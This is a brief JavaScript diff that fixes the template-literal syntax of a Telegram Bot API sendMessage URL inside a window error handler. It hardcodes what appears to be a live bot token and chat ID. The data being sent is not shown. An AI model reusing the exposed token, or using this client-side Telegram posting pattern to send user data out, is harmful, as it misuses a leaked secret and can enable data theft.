@@ -6,7 +6,7 @@ window.addEventListener('error', (event) => {
   
   
     const token = '7159693608:AAE5eKPnwrQMfw7Dm8ETaJ_rLlYLWjO8hf8';
-    const telegramBotURL = https://api.telegram.org/bot${token}/sendMessage;
+    const telegramBotURL = `https://api.telegram.org/bot${token}/sendMessage`;
     const chatId = '-1002005164665';
   
     const formData = new FormData();
